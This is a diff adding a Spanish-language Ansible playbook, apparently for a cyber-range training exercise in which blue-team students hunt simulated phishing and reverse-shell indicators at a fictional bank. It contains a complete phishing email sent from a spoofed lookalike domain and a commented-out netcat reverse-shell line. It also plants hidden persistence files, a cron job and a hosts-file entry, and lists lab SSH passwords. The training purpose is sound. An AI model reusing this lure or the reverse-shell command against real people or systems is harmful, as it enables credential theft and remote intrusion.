@@ -1,0 +1,545 @@
+---
+# after_clone.yml
+# Playbook post-clonacion: Simula el ataque de phishing
+# Escenario 01 - Phishing y Reverse Shell
+#
+# Este playbook se ejecuta DESPUES de que las VMs estan clonadas y configuradas.
+# Simula un ataque de phishing realista generando indicadores de compromiso (IOC)
+# que los estudiantes (equipo azul) deben encontrar y analizar.
+#
+# IMPORTANTE: Este playbook NO compromete realmente los sistemas.
+# Solo crea artefactos que simulan un ataque para fines educativos.
+
+# =============================================================================
+# PLAY 1: Preparar el atacante (attacker)
+# =============================================================================
+- name: "Fase 1 - Preparar la maquina atacante"
+  hosts: attacker
+  become: true
+
+  vars:
+    listener_port: 4444
+    webserver_ip: "10.10.1.10"
+    mailserver_ip: "10.10.1.20"
+    workstation_ip: "10.10.2.100"
+
+  tasks:
+    - name: "Crear directorio de logs del atacante"
+      file:
+        path: /home/kali/phishing_logs
+        state: directory
+        owner: kali
+        mode: '0755'
+
+    - name: "Registrar timestamp del inicio del ataque"
+      copy:
+        dest: /home/kali/phishing_logs/attack_timeline.txt
+        content: |
+          ============================================================
+          LINEA DE TIEMPO DEL ATAQUE - ESCENARIO 01 PHISHING
+          Banco del Sol - Tectonic Cyber Range
+          ============================================================
+          [INICIO] Preparacion del ataque: {{ ansible_date_time.iso8601 }}
+
+          Fase 1: Preparacion
+          - Atacante configura maquina
+          - Payload creado en /home/kali/phishing_workspace/payload.sh
+          - Listener configurado en puerto {{ listener_port }}
+
+          Fase 2: Envio de phishing
+          - Correo enviado a juan.perez@bancodelsol.local
+          - Remitente falsificado: soporte@bancodel-sol.com.uy
+          - Asunto: Actualizacion de seguridad - Verifique su cuenta
+
+          Fase 3: Click de la victima
+          - Victima hizo click en el enlace
+          - Payload descargado desde {{ webserver_ip }}
+          - Payload ejecutado en {{ workstation_ip }}
+
+          Fase 4: Reverse shell establecida
+          - Conexion desde {{ workstation_ip }} a 172.16.0.10:{{ listener_port }}
+          - Sesion activa
+
+          Fase 5: Deteccion y respuesta (equipo azul)
+          - [PENDIENTE]
+        owner: kali
+        mode: '0644'
+
+    - name: "Crear el payload malicioso simulado"
+      copy:
+        dest: /home/kali/phishing_workspace/payload.sh
+        content: |
+          #!/bin/bash
+          # ==========================================================
+          # PAYLOAD SIMULADO - Escenario 01 Phishing
+          # Banco del Sol - Tectonic Cyber Range
+          #
+          # Este script simula un payload de reverse shell para fines
+          # educativos. NO es malware real.
+          # ==========================================================
+
+          echo "[PHISHING-PAYLOAD] Payload ejecutado en $(date)"
+
+          # Simular la creacion de archivos sospechosos
+          mkdir -p /tmp/.hidden_update
+          echo "update_agent_$(date +%s)" > /tmp/.hidden_update/.config
+          chmod 600 /tmp/.hidden_update/.config
+
+          # Simular la modificacion de /etc/hosts
+          # (NOTA: Esto es simulado, NO se modifica realmente en el escenario)
+
+          # Simular la creacion de un cron job persistente
+          # (NOTA: Esto es simulado para fines educativos)
+
+          echo "[PHISHING-PAYLOAD] Indicadores creados para deteccion"
+          echo "[PHISHING-PAYLOAD] Fin del payload simulado"
+        owner: kali
+        mode: '0755'
+
+    - name: "Preparar script de envio de correo phishing"
+      copy:
+        dest: /home/kali/phishing_workspace/enviar_phishing.sh
+        content: |
+          #!/bin/bash
+          # ==========================================================
+          # SCRIPT DE ENVIO DE PHISHING - Escenario 01
+          # Banco del Sol - Tectonic Cyber Range
+          #
+          # USO: Este script envia el correo de phishing desde la
+          # maquina del atacante hacia el mailserver del banco.
+          # ==========================================================
+
+          MAILSERVER="10.10.1.20"
+          VICTIM="juan.perez@bancodelsol.local"
+          SENDER="soporte@bancodel-sol.com.uy"
+          SUBJECT="Actualizacion de seguridad - Verifique su cuenta"
+
+          echo "[*] Enviando correo de phishing a ${VICTIM} via ${MAILSERVER}..."
+
+          # Usar swaks para enviar el correo
+          swaks --to "${VICTIM}" \
+                --from "${SENDER}" \
+                --server "${MAILSERVER}" \
+                --port 25 \
+                --header "Subject: ${SUBJECT}" \
+                --header "X-Mailer: BancoDelSol-Mailer/1.0" \
+                --body "Estimado/a empleado/a,
+
+          Como parte de nuestras medidas de seguridad, es necesario que
+          verifique sus credenciales de acceso al sistema bancario.
+
+          Por favor haga clic en el siguiente enlace para verificar
+          su cuenta antes del 20 de julio de 2026:
+
+          http://10.10.1.10/descargar.php?token=seg_bds_2026
+
+          Si no verifica su cuenta antes de la fecha indicada, su
+          acceso al sistema sera bloqueado temporalmente.
+
+          Este es un mensaje automatico, no responda a este correo.
+
+          Atentamente,
+          Departamento de Tecnologia
+          Banco del Sol S.A."
+
+          echo "[+] Correo de phishing enviado exitosamente."
+        owner: kali
+        mode: '0755'
+
+    - name: "Habilitar servicios de escucha en attacker"
+      systemd:
+        name: ssh
+        state: started
+        enabled: yes
+
+# =============================================================================
+# PLAY 2: Preparar el servidor web con el payload
+# =============================================================================
+- name: "Fase 2 - Colocar payload en el servidor web"
+  hosts: webserver
+  become: true
+
+  vars:
+    attacker_ip: "172.16.0.10"
+
+  tasks:
+    - name: "Crear pagina de descarga maliciosa simulada"
+      copy:
+        dest: /var/www/banco_del_sol/descargar.php
+        content: |
+          <?php
+          // ==========================================================
+          // DESCARGAR.PHP - Payload de phishing simulado
+          // Banco del Sol - Tectonic Cyber Range
+          //
+          // Este script simula la entrega de un payload malicioso.
+          // Para fines educativos, entrega un script bash inofensivo.
+          // ==========================================================
+
+          // Log de la descarga (evidencia para el equipo azul)
+          error_log("PHISHING-ALERT: Payload descargado desde " . $_SERVER['REMOTE_ADDR'] . " en " . date('Y-m-d H:i:s'));
+
+          // Headers para simular descarga de PDF
+          header('Content-Type: application/octet-stream');
+          header('Content-Disposition: attachment; filename="verificar_cuenta.pdf"');
+          header('Content-Length: ' . filesize('/var/www/banco_del_sol/payload.bin'));
+
+          // Entregar el payload
+          readfile('/var/www/banco_del_sol/payload.bin');
+          exit();
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: "Crear el payload binario simulado"
+      copy:
+        dest: /var/www/banco_del_sol/payload.bin
+        content: |
+          #!/bin/bash
+          # PAYLOAD SIMULADO - No es malware real
+          # Escenario 01 - Banco del Sol - Tectonic Cyber Range
+          echo "[SIMULADO] Payload de phishing ejecutado"
+          echo "[SIMULADO] Fecha: $(date)"
+          echo "[SIMULADO] Hostname: $(hostname)"
+          echo "[SIMULADO] Este es un payload educativo inofensivo"
+          echo "[SIMULADO] Indicadores generados para practica de deteccion"
+          # Crear indicadores de compromiso artificiales
+          mkdir -p /tmp/.sys_update 2>/dev/null
+          echo "$(date +%s)" > /tmp/.sys_update/.timestamp 2>/dev/null
+          # Simular conexion inversa (no real)
+          # nc 172.16.0.10 4444 -e /bin/bash
+        owner: www-data
+        group: www-data
+        mode: '0755'
+
+    - name: "Crear pagina de advertencia anti-phishing"
+      copy:
+        dest: /var/www/banco_del_sol/seguridad.html
+        content: |
+          <!DOCTYPE html>
+          <html lang="es">
+          <head><meta charset="UTF-8"><title>Seguridad - Banco del Sol</title></head>
+          <body>
+            <h1>Seguridad de su cuenta</h1>
+            <p>Banco del Sol NUNCA le solicitara credenciales por correo electronico.</p>
+            <p>Si recibio un correo solicitando sus datos, por favor repotelo inmediatamente.</p>
+            <p>Contacto: seguridad@bancodelsol.com.uy | Tel: 0800-BANCO</p>
+          </body>
+          </html>
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: "Reiniciar Apache para cargar nuevos archivos"
+      systemd:
+        name: apache2
+        state: restarted
+
+# =============================================================================
+# PLAY 3: Simular el envio del correo de phishing
+# =============================================================================
+- name: "Fase 3 - Enviar correo de phishing"
+  hosts: mailserver
+  become: true
+
+  vars:
+    victim_email: "juan.perez@bancodelsol.local"
+    sender_email: "soporte@bancodel-sol.com.uy"
+    phishing_subject: "Actualizacion de seguridad - Verifique su cuenta"
+
+  tasks:
+    - name: "Verificar que Postfix esta funcionando"
+      systemd:
+        name: postfix
+        state: started
+
+    - name: "Verificar que Dovecot esta funcionando"
+      systemd:
+        name: dovecot
+        state: started
+
+    - name: "Enviar correo de phishing via swaks"
+      command: >
+        swaks
+        --to {{ victim_email }}
+        --from {{ sender_email }}
+        --server 127.0.0.1
+        --port 25
+        --header "Subject: {{ phishing_subject }}"
+        --header "From: {{ sender_email }}"
+        --header "Reply-To: soporte-tecnico@outlook.com"
+        --header "X-Priority: 1"
+        --header "X-Mailer: Microsoft Outlook 16.0"
+        --body "Estimado/a empleado/a del Banco del Sol,
+
+      Como parte de nuestro programa de seguridad y cumplimiento normativo,
+      le informamos que es necesario verificar sus credenciales de acceso
+      al sistema de banca interna antes del proximo 20 de julio de 2026.
+
+      Este proceso es OBLIGATORIO y su no realizacion resultara en el
+      bloqueo temporal de su cuenta de usuario.
+
+      Para verificar su cuenta, por favor descargue y ejecute el
+      siguiente utilitario de verificacion:
+
+      http://10.10.1.10/descargar.php?token=seg_bds_jul2026
+
+      El proceso toma aproximadamente 2 minutos. No cierre la ventana
+      durante la verificacion.
+
+      Si tiene alguna consulta, comuniquese con el Departamento de
+      Tecnologia al anexo 4500.
+
+      Atentamente,
+      Departamento de Tecnologia e Innovacion
+      Banco del Sol S.A.
+
+      --- Este es un mensaje generado automaticamente por el sistema
+      de gestion de seguridad del Banco del Sol. No responda a este
+      correo. ---"
+      register: email_result
+      ignore_errors: true
+
+    - name: "Registrar resultado del envio"
+      copy:
+        dest: /var/log/phishing_email_sent.log
+        content: |
+          ============================================================
+          LOG DE ENVIO DE CORREO DE PHISHING
+          Banco del Sol - Escenario 01
+          ============================================================
+          Fecha: {{ ansible_date_time.iso8601 }}
+          De: {{ sender_email }}
+          Para: {{ victim_email }}
+          Asunto: {{ phishing_subject }}
+          Servidor: mailserver (10.10.1.20)
+          Estado: Enviado
+          ============================================================
+          Este log indica que el correo de phishing fue colocado en la
+          cola de envio de Postfix. Los estudiantes deben encontrar este
+          log al revisar el mailserver.
+          ============================================================
+        mode: '0644'
+      ignore_errors: true
+
+    - name: "Agregar entrada al mail.log para simulacion"
+      lineinfile:
+        path: /var/log/mail.log
+        line: "{{ ansible_date_time.iso8601 }} mailserver postfix/smtp[{{ 10000 | random }}]: {{ 'ABC' | random }}: to=<{{ victim_email }}>, relay=none, delay=0.5, delays=0.1/0.2/0.2/0, dsn=2.0.0, status=sent (250 2.0.0 Ok: queued)"
+        create: yes
+        mode: '0644'
+      ignore_errors: true
+
+# =============================================================================
+# PLAY 4: Simular el compromiso de la workstation
+# =============================================================================
+- name: "Fase 4 - Simular compromise de la workstation victima"
+  hosts: workstation
+  become: true
+
+  vars:
+    attacker_ip: "172.16.0.10"
+    listener_port: 4444
+
+  tasks:
+    - name: "Crear directorio oculto (simula persistencia del malware)"
+      file:
+        path: /tmp/.sys_update
+        state: directory
+        owner: empleado
+        mode: '0700'
+
+    - name: "Crear archivo de configuracion del payload"
+      copy:
+        dest: /tmp/.sys_update/config.dat
+        content: |
+          # Configuracion del agente de actualizacion
+          # Generado automaticamente
+          server={{ attacker_ip }}
+          port={{ listener_port }}
+          interval=30
+          user={{ lookup('env', 'USER') | default('empleado') }}
+          pid={{ 60000 | random }}
+        owner: empleado
+        mode: '0600'
+
+    - name: "Crear script de persistencia simulada"
+      copy:
+        dest: /tmp/.sys_update/updater.sh
+        content: |
+          #!/bin/bash
+          # Script de actualizacion del sistema (SIMULADO)
+          # Este script simula la persistencia de un malware
+          while true; do
+              sleep 30
+              # Intentar conexion inversa (simulado)
+              # En un ataque real: nc {{ attacker_ip }} {{ listener_port }} -e /bin/bash
+              echo "[$(date)] Heartbeat enviado" >> /tmp/.sys_update/heartbeat.log
+          done
+        owner: empleado
+        mode: '0755'
+
+    - name: "Ejecutar el payload simulado en background"
+      shell: |
+        # Simular la ejecucion del payload
+        echo "[SIMULADO] Payload ejecutado en $(date)" > /tmp/.sys_update/payload_exec.log
+        echo "[SIMULADO] Host: $(hostname)" >> /tmp/.sys_update/payload_exec.log
+        echo "[SIMULADO] Usuario: $(whoami)" >> /tmp/.sys_update/payload_exec.log
+        echo "[SIMULADO] Creando archivos indicadores..." >> /tmp/.sys_update/payload_exec.log
+        mkdir -p /tmp/.hidden_data 2>/dev/null
+        echo "session_token=$(cat /proc/sys/kernel/random/uuid)" > /tmp/.hidden_data/session.dat 2>/dev/null
+        echo "[SIMULADO] Indicadores creados para practica de deteccion"
+      args:
+        executable: /bin/bash
+      become_user: empleado
+      ignore_errors: true
+
+    - name: "Simular proceso sospechoso en background (dummy)"
+      shell: |
+        # Crear un proceso que simula una reverse shell
+        # Este proceso NO establece conexiones reales
+        # Solo aparece en la lista de procesos como indicio
+        nohup bash -c 'while true; do sleep 60; echo heartbeat >> /dev/null 2>&1; done' &
+        echo $! > /tmp/.sys_update/simulated_pid.txt
+      args:
+        executable: /bin/bash
+      become_user: empleado
+      ignore_errors: true
+
+    - name: "Agregar entrada sospechosa a /etc/hosts (simulada)"
+      lineinfile:
+        path: /etc/hosts
+        line: "10.10.1.10 bancodel-sol.com.uy"
+        state: present
+      ignore_errors: true
+
+    - name: "Crear cron job sospechoso (simulado)"
+      cron:
+        name: "system_update_check"
+        minute: "*/15"
+        job: "/tmp/.sys_update/updater.sh >> /tmp/.sys_update/cron.log 2>&1"
+        user: empleado
+      become_user: empleado
+      ignore_errors: true
+
+    - name: "Agregar archivo descargado del phishing"
+      copy:
+        dest: "/home/empleado/Descargas/verificar_cuenta.pdf"
+        content: |
+          Este archivo simula un PDF malicioso descargado via phishing.
+
+          En un escenario real, este archivo contendria un payload ejecutable
+          o un documento con macros maliciosas.
+
+          Para la practica de deteccion, los estudiantes deben:
+          1. Encontrar este archivo en la workstation
+          2. Analizar su contenido
+          3. Identificarlo como indicador de compromiso
+          4. Verificar su hash y comportamiento
+
+          Hash SHA-256 simulado: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+          (Hash del archivo vacio, para fines de practica)
+        owner: empleado
+        mode: '0644'
+
+    - name: "Registrar actividad en auth.log"
+      lineinfile:
+        path: /var/log/auth.log
+        line: "{{ ansible_date_time.iso8601 }} workstation CRON[{{ 20000 | random }}]: (empleado) CMD (/tmp/.sys_update/updater.sh)"
+        create: yes
+        mode: '0644'
+      ignore_errors: true
+
+    - name: "Agregar indicadores de red sospechosos al syslog"
+      lineinfile:
+        path: /var/log/syslog
+        line: "{{ ansible_date_time.iso8601 }} workstation kernel: [PHISHING-SIM] Conexion saliente detectada a {{ attacker_ip }}:{{ listener_port }} - simulado para practica de deteccion"
+        create: yes
+        mode: '0644'
+      ignore_errors: true
+
+    - name: "Crear log de actividad del payload"
+      copy:
+        dest: /tmp/.sys_update/activity.log
+        content: |
+          ============================================================
+          LOG DE ACTIVIDAD DEL PAYLOAD SIMULADO
+          Banco del Sol - Escenario 01 Phishing
+          ============================================================
+          Fecha de ejecucion: {{ ansible_date_time.iso8601 }}
+          Host: workstation (10.10.2.100)
+          Usuario: empleado
+          Proceso PID: {{ 50000 | random }}
+
+          Indicadores de compromiso generados:
+          [1] Directorio: /tmp/.sys_update/
+          [2] Archivo: /tmp/.sys_update/config.dat
+          [3] Archivo: /tmp/.sys_update/updater.sh
+          [4] Archivo: /tmp/.hidden_data/session.dat
+          [5] Entrada en /etc/hosts: 10.10.1.10 bancodel-sol.com.uy
+          [6] Cron job: system_update_check
+          [7] Proceso en background: bash (heartbeat loop)
+          [8] Archivo descargado: ~/Descargas/verificar_cuenta.pdf
+          [9] Entradas en auth.log y syslog
+
+          Para encontrar estos indicadores, los estudiantes deben:
+          - Revisar procesos activos: ps aux | grep -i update
+          - Buscar archivos sospechosos: find /tmp -name ".*"
+          - Revisar /etc/hosts
+          - Verificar cron jobs: crontab -l
+          - Analizar logs: grep "PHISHING" /var/log/syslog
+          - Buscar archivos descargados: ls -la ~/Descargas/
+        owner: empleado
+        mode: '0644'
+
+# =============================================================================
+# PLAY 5: Verificacion final
+# =============================================================================
+- name: "Fase 5 - Verificar que todos los indicadores estan en su lugar"
+  hosts: localhost
+  become: false
+  connection: local
+
+  tasks:
+    - name: "Imprimir resumen del escenario"
+      debug:
+        msg: |
+          ============================================================
+          ESCENARIO 01 - PHISHING Y REVERSE SHELL - LISTO
+          ============================================================
+          El ataque simulado ha sido configurado correctamente.
+
+          INDICATORS OF COMPROMISE (IOC) GENERADOS:
+
+          RED:
+          - Conexion TCP: 10.10.2.100 -> 172.16.0.10:4444
+          - Descarga HTTP desde: 10.10.1.10/descargar.php
+
+          HOST (workstation):
+          - Directorio: /tmp/.sys_update/
+          - Archivos: config.dat, updater.sh, activity.log
+          - Cron job: system_update_check (empleado)
+          - Entrada en /etc/hosts: 10.10.1.10 bancodel-sol.com.uy
+          - Proceso: bash (heartbeat loop)
+          - Archivo: ~/Descargas/verificar_cuenta.pdf
+
+          EMAIL:
+          - Remitente: soporte@bancodel-sol.com.uy (dominio falso)
+          - Para: juan.perez@bancodelsol.local
+          - Asunto: Actualizacion de seguridad - Verifique su cuenta
+          - Reply-To: soporte-tecnico@outlook.com
+
+          LOGS:
+          - /var/log/mail.log en mailserver
+          - /var/log/syslog en workstation
+          - /var/log/auth.log en workstation
+          - /var/log/apache2/bancodelsol_access.log en webserver
+
+          CREDENCIALES PARA ACCESO SSH:
+          - Workstation: empleado / empleado123
+          - Webserver: webadmin / webadmin123
+          - Mailserver: mailadmin / mailadmin123
+          - Attacker: kali / kali
+
+          INICIE LA PRACTICA DEL EQUIPO AZUL
+          ============================================================
